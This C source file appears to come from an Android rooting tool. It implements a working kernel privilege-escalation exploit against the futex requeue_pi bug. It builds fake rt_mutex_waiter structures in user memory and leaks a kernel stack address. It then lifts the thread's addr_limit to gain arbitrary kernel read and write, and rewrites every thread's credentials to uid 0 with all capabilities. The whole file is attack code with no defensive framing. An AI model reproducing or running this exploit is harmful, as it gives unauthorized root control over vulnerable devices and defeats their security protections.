#define _GNU_SOURCE

#include <jni.h>
#include <sched.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/resource.h>

#include "root.h"
#include "list.h"
#include "semctl.h"
#include "futaux.h"
#include "rtmutex.h"
#include "logging.h"
#include "userlock.h"
#include "kernel_rw.h"
#include "kernel_structs.h"
#include "restore_execution.h"

#include "com_nativeflow_root_Root.h"

#define __count_of(x) ((sizeof(x))/(sizeof(*(x))))

/* User locks to help coordinate the various threads */
static volatile int invoke_semctl;
static volatile int invoke_futex_wait_requeue_pi;
static volatile int waiter_thread_may_wait_on_lock;
static volatile int memory_limit_override_completed;
static volatile int can_read_from_kernel;
static volatile int new_waiter_spawned;
static volatile int compromised_finished_testing_readability;

static volatile int kernel_write_achieved = 0;
static volatile int r00ted = 0;

static pid_t main_tid;

static struct rt_mutex_waiter *fake_waiter = NULL;
static struct rt_mutex_waiter *fake_waiter_prev = NULL;

struct thread_info *k_thread_info = NULL;

static uint16_t sem_values[SEMMSL_FAST];

static struct rt_mutex_waiter *rt_waiter_addr = NULL;
static long int rt_waiter_offset = 0;

/* futex locks */
static int A = 0, B = 0;

static volatile pid_t waiter_thread_tid = -1;
static volatile pid_t bugged_tid = -1;

void *thread(void *arg)
{
    int ret = 0;
    int sem_id = 0;

    struct rt_mutex_waiter *k_waiter = NULL;

    sem_id = semget(IPC_PRIVATE, SEMMSL, IPC_CREAT | 0660);
    if (sem_id < 0) {
        perror("Failed to create semaphor");
        goto Wait_forever;
    }

    memset(sem_values, 0, sizeof(sem_values));
    /* rt_waiter overlaps with semctl_main's fast_sem_io after 248 bytes */
    k_waiter = (struct rt_mutex_waiter *)((void *)sem_values + 0xa8);
    k_waiter->list_entry.prio = 120 + 12; /* Preserve the priority */
    k_waiter->list_entry.prio_list.next = &fake_waiter->list_entry.prio_list;
    k_waiter->list_entry.prio_list.prev = &fake_waiter->list_entry.prio_list;
    k_waiter->list_entry.node_list.next = &fake_waiter->list_entry.node_list;
    k_waiter->list_entry.node_list.prev = &fake_waiter->list_entry.node_list;

    /* Right after copying the semaphors to semctl_main's stack, there is
     * a verification loop on the semaphor values which fails if any of the
     * semaphors has a value larger than SEMVMX.
     * We want the check to fail so that the system call will return without
     * actually doing any processing */
    sem_values[0] = SEMVMX;

    bugged_tid = gettid();
    setpriority(PRIO_PROCESS, 0, 12);

    userlock_wait(&invoke_futex_wait_requeue_pi);
    futex_wait_requeue_pi(&A, &B);

    while (!kernel_write_achieved) {
        ret = semctl(sem_id, -1, SETALL, sem_values);
    }

Wait_forever:
    while (1) {
        sleep(10);
    }
}

void wakeup(int signum)
{
    int fd;
    uint32_t memory_limit = 0;
    uint32_t unlimited_memory_limit = 0xffffffff;
    struct task_struct task = {0};
    struct thread_info tinfo = {0};
    struct cred credentials;
    struct task_struct *iter = NULL, *leader = NULL;
    struct task_struct current;

    ALOGD("Root", "Thread %d woke up", gettid());

    fd = open("/dev/null", O_RDWR);
    while (1) {
        if (write(fd, &k_thread_info->addr_limit, sizeof(uint32_t)) > 0) {
            break;
        }
        userlock_release(&compromised_finished_testing_readability);
        userlock_wait(&new_waiter_spawned);
        userlock_lock(&new_waiter_spawned);
    }

    kernel_write_achieved = 1;
    userlock_release(&compromised_finished_testing_readability);

    ALOGD("Root", "Thread can write to kernel memory_limit");

    read_kern(&k_thread_info->addr_limit, &memory_limit, sizeof(memory_limit));

    ALOGD("Root", "Memory limit = %p", (void *)memory_limit);

    write_kern(&k_thread_info->addr_limit, &unlimited_memory_limit,
            sizeof(memory_limit));
    read_kern(&k_thread_info->addr_limit, &memory_limit, sizeof(memory_limit));

    ALOGD("Root", "Memory limit = %p", (void *)memory_limit);
    ALOGD("Root", "Reading thread info");

    read_kern(k_thread_info, &tinfo, sizeof(tinfo));

    ALOGD("Root", "Reading task struct");

    read_kern((void *)tinfo.task, &task, sizeof(task));

    iter = leader = task.group_leader;
    do {
        read_kern(iter, &current, sizeof(current));

        ALOGD("Root", "Reading cred struct of task @%p with pid %d",
                iter, current.pid);

        read_kern((void *)current.cred, &credentials, sizeof(credentials));

        ALOGD("Root", "Modifying cred info to uid 0");

        credentials.uid = 0;
        credentials.gid = 0;
        credentials.suid = 0;
        credentials.sgid = 0;
        credentials.euid = 0;
        credentials.egid = 0;
        credentials.fsuid = 0;
        credentials.fsgid = 0;

        credentials.cap_inheritable.cap[0] = 0xffffffff;
        credentials.cap_inheritable.cap[1] = 0xffffffff;
        credentials.cap_permitted.cap[0] = 0xffffffff;
        credentials.cap_permitted.cap[1] = 0xffffffff;
        credentials.cap_effective.cap[0] = 0xffffffff;
        credentials.cap_effective.cap[1] = 0xffffffff;
        credentials.cap_bset.cap[0] = 0xffffffff;
        credentials.cap_bset.cap[1] = 0xffffffff;

        ALOGD("Root", "Writing modified cred to task_struct");
        /* Just copy the credential info, don't do anything to the "usage" of
         * the cred structure */
        write_kern((void *)&current.cred->uid, &credentials.uid,
                sizeof(credentials) - sizeof(credentials.usage));

        /* We also need to override the memory limit of all the threads */
        write_kern((void *)&current.stack->addr_limit, &unlimited_memory_limit,
                sizeof(unlimited_memory_limit));

        iter = list_entry(current.thread_group.next, struct task_struct,
                thread_group);
    } while (iter != leader);
    
    ALOGD("Root", "Our uid is: %d", getuid());
    ALOGD("Root", "Our gid is: %d", getgid());

    r00ted = 1;

	while (1) {
		sleep(10);
	}
}

void *waiter_thread(void *arg)
{
    struct sigaction act;
    int priority = (int)arg;
    
    act.sa_handler = wakeup;
    act.sa_mask = 0;
    act.sa_flags = 0;
    act.sa_restorer = NULL;
    sigaction(SIGUSR2, &act, NULL);

    waiter_thread_tid = gettid();
    setpriority(PRIO_PROCESS, 0, priority);
    userlock_wait(&waiter_thread_may_wait_on_lock);

    futex_lock_pi(&B);
    while (1) {
        sleep(1);
    }
}

pid_t add_waiter_to_lock(int priority)
{
    int ret;
    pid_t tid;
    pthread_t t;
    int context_switch_count = 0;
    userlock_lock(&waiter_thread_may_wait_on_lock);
    ret = pthread_create(&t, NULL, waiter_thread, (void *)priority);
    if (ret) {
        perror("Failed to spawn waiter_thread");
        return 0;
    }

    while (waiter_thread_tid < 0) {
        usleep(10);
    }
    ALOGD("Root", "New thread added with tid: %d", waiter_thread_tid);
    tid = waiter_thread_tid;
    waiter_thread_tid = -1;

    context_switch_count = get_voluntary_ctxt_switches(tid);
    userlock_release(&waiter_thread_may_wait_on_lock);
    wait_for_thread_to_wait_in_kernel(tid, context_switch_count);
    return tid;
}

struct thread_info *do_root(void)
{
    int ret = 0;
    int context_switch_count = 0;
    pthread_t bugged, sink;
    pid_t compromised_tid = 0;

    main_tid = gettid();

    fake_waiter = (struct rt_mutex_waiter *)mmap((void *)0xa0000000, 0x1000,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

    if (MAP_FAILED == fake_waiter) {
        perror("Failed to set-up shared memory");
        goto Exit;
    }

    fake_waiter_prev = (struct rt_mutex_waiter *)mmap((void *)0xa0010000, 0x1000,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

    if (MAP_FAILED == fake_waiter_prev) {
        perror("Failed to set-up shared memory");
        goto Exit;
    }

    /* Set up the fake waiter's list_entry to close a loop on itself so it
     * would form a valid linked list */
    fake_waiter->list_entry.prio = 120 + 13;
    fake_waiter->list_entry.prio_list.next = &fake_waiter_prev->list_entry.prio_list;
    fake_waiter->list_entry.prio_list.prev = &fake_waiter_prev->list_entry.prio_list;
    fake_waiter->list_entry.node_list.next = &fake_waiter_prev->list_entry.node_list;
    fake_waiter->list_entry.node_list.prev = &fake_waiter_prev->list_entry.node_list;

    fake_waiter_prev->list_entry.prio = 120 + 11;
    fake_waiter_prev->list_entry.prio_list.next = &fake_waiter->list_entry.prio_list;
    fake_waiter_prev->list_entry.prio_list.prev = &fake_waiter->list_entry.prio_list;
    fake_waiter_prev->list_entry.node_list.next = &fake_waiter->list_entry.node_list;
    fake_waiter_prev->list_entry.node_list.prev = &fake_waiter->list_entry.node_list;

    ALOGD("Root", "Acquire B so that any other call to futex_lock_pi(&B) will block");
    /* Acquire B so that any other call to futex_lock_pi(&B) will block */
    ret = futex_lock_pi(&B);
    if (ret) {
        perror("Failed to acquire lock B");
        goto Exit;
    }

    userlock_lock(&invoke_semctl);
    userlock_lock(&invoke_futex_wait_requeue_pi);
    if (pthread_create(&bugged, NULL, thread, NULL)) {
        perror("Failed to create thread");
        goto Exit;
    }
    ALOGD("Root", "Wait for the thread to be in a system call");
    /* Wait for the thread to be in a system call */
    while (bugged_tid < 0) {
        usleep(10);
    }
    context_switch_count = get_voluntary_ctxt_switches(bugged_tid);
    userlock_release(&invoke_futex_wait_requeue_pi);
    wait_for_thread_to_wait_in_kernel(bugged_tid, context_switch_count);

    ALOGD("Root", "Attempt to proxy-queue futex_wait_requeue_pi's rt_waiter");
    /* Attempt to proxy-queue futex_wait_requeue_pi's rt_waiter */
    futex_requeue_pi(&A, &B, A);

    add_waiter_to_lock(7);

    ALOGD("Root", "Release B");
    /* Release B */
    B = 0;

    ALOGD("Root", "Force futex_wait_requeue_pi to wake up and return");
    /* Force futex_wait_requeue_pi to wake up and return, leaving a dangling
     * rt_mutex_waiter object on the kernel stack */
    futex_requeue_pi(&B, &B, B);

    /* Add another waiter to the list, this should trigger a leak of a kernel
     * pointer into the fake_waiter */
    fake_waiter->list_entry.prio = 120 + 13;
    fake_waiter->list_entry.prio_list.next = &fake_waiter_prev->list_entry.prio_list;
    fake_waiter->list_entry.prio_list.prev = &fake_waiter_prev->list_entry.prio_list;
    fake_waiter->list_entry.node_list.next = &fake_waiter_prev->list_entry.node_list;
    fake_waiter->list_entry.node_list.prev = &fake_waiter_prev->list_entry.node_list;

    fake_waiter_prev->list_entry.prio = 120 + 11;
    fake_waiter_prev->list_entry.prio_list.next = &fake_waiter->list_entry.prio_list;
    fake_waiter_prev->list_entry.prio_list.prev = &fake_waiter->list_entry.prio_list;
    fake_waiter_prev->list_entry.node_list.next = &fake_waiter->list_entry.node_list;
    fake_waiter_prev->list_entry.node_list.prev = &fake_waiter->list_entry.node_list;

    sleep(1);
    compromised_tid = add_waiter_to_lock(12);

    rt_waiter_addr = (struct rt_mutex_waiter *)list_entry(
            fake_waiter->list_entry.node_list.prev,
            struct plist_node, node_list);

    ALOGD("Root", "&added_waiter.list_entry.node_list = %p",
            fake_waiter->list_entry.node_list.prev);
    ALOGD("Root", "&added_waiter @%p", rt_waiter_addr);

    k_thread_info = (struct thread_info *)((uint32_t)fake_waiter->list_entry.node_list.prev & 0xffffe000);

    rt_waiter_offset = (uint32_t)rt_waiter_addr - (uint32_t)k_thread_info;

    ALOGD("Root", "All your base are %p", k_thread_info);
    ALOGD("Root", "Offset of rt_mutex_waiter in stack %p",
            (void *)rt_waiter_offset);

    kill(compromised_tid, SIGUSR2);
    /* Start adding new waiters until we manage to override the compromised
     * thread's memory_limit with a large enough value that it manages to
     * access kernel memory by writing a kernel memory to /dev/null  */

    can_read_from_kernel = 0;
    userlock_lock(&compromised_finished_testing_readability);
    userlock_lock(&new_waiter_spawned);
    while (!can_read_from_kernel) {
        userlock_wait(&compromised_finished_testing_readability);
        if (kernel_write_achieved) {
            break;
        }
        /* Fix the fake waiters and try again */
        fake_waiter->list_entry.prio = 120 + 13;
        fake_waiter->list_entry.prio_list.next = &fake_waiter_prev->list_entry.prio_list;
        fake_waiter->list_entry.prio_list.prev = &fake_waiter_prev->list_entry.prio_list;
        fake_waiter->list_entry.node_list.next = &fake_waiter_prev->list_entry.node_list;
        fake_waiter->list_entry.node_list.prev = &fake_waiter_prev->list_entry.node_list;

        fake_waiter_prev->list_entry.prio = 120 + 11;
        fake_waiter_prev->list_entry.prio_list.next = &fake_waiter->list_entry.prio_list;
        fake_waiter_prev->list_entry.prio_list.prev = &fake_waiter->list_entry.prio_list;
        fake_waiter_prev->list_entry.node_list.next = &fake_waiter->list_entry.node_list;
        fake_waiter_prev->list_entry.node_list.prev = &fake_waiter->list_entry.node_list;

        fake_waiter->list_entry.node_list.prev = (void *)&k_thread_info->addr_limit;
        fake_waiter_prev->list_entry.node_list.next = (void *)&k_thread_info->addr_limit;

        ALOGD("Root", "Adding a new waiter");
        sleep(1);
        add_waiter_to_lock(12);

        userlock_release(&new_waiter_spawned);
        userlock_lock(&compromised_finished_testing_readability);
    }

    while (!r00ted) {
        sleep(1);
    }

Exit:
    ALOGD("Root", "Done");

    return k_thread_info;
}
